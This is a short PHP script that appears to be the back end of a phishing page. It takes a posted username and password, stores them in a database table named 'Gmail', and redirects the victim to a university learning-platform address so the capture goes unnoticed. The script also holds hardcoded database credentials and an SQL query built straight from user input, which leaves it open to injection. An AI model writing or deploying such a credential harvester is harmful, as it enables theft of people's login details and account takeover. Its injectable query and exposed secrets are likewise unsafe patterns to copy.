<?php 

Header('Location: http://www.ilearn.ucr.edu');

$con = mysqli_connect("localhost","KyleM","Minshall1!","Site");

if (mysqli_connect_errno()) 
{
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
}

$username = $_POST['username'];
$password = $_POST['password'];

mysqli_query($con,"INSERT INTO Gmail (Username, Password) VALUES ('$username', '$password')");

mysqli_close($con);

?>